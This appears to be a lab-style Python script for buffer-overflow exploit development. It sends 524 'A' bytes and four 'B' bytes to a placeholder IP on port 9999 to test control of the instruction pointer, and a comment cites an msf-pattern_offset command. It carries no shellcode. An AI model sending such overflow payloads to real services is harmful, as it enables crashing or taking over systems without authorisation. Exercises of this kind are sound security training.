#!/usr/bin/python

import socket
import sys


#msf-pattern_offset -l 1000 -q 35724134
size = 524

payload = "A" * size + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('IP',9999))
	s.recv(1024)
	s.send(payload)
	print('Sent payload')
	s.close()
	
except:
	print('Error')
	sys.exit()
